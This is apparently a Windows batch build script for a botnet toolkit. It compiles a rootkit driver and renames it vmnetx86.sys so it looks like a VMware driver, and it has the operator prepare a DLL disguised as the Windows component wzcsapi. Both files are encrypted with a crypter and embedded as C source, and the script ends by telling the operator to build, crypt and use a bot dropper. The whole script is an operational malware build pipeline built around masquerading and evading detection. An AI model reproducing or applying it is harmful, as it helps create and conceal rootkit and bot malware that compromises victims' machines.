@echo "=======   Start global make.. ========"
cd bot_sys
echo Compile driver..

@build -ceZgw
cd bin\i386\ 
copy bot_rootkit.sys ..\..\..\vmnetx86.sys /y
del *.log
cd ..\..\..\

echo "Now please config DLL and make it to wzcsapi-SP2.dll, then press enter"
pause
echo "Make depend...crypt buffers"

@echo off
echo "Start crypt driver, press any key.."
pause
bin_crypter.exe vmnetx86.sys vmnetx86.bin
BIN2TEXT.exe C vmnetx86.bin rootkit.c

echo "Start crypt DLL, press any key.."
pause
bin_crypter.exe wzcsapi-SP2.dll wzcsapi.bin
BIN2TEXT.exe C wzcsapi.bin bot.c

echo "Please Make dropperand you can crypt bot_dropper.exe and use"